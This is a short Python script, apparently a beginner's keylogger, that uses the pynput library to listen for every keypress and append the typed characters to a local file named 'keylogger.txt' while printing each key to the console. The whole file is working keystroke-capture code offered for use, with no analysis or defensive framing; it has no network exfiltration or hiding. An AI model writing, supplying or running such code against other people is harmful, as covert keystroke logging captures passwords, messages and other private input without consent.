from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylogger.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)

        except:
            print("No Input!!!")

if __name__ == "__main__":

    print('\033[91m' + "Running......")
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
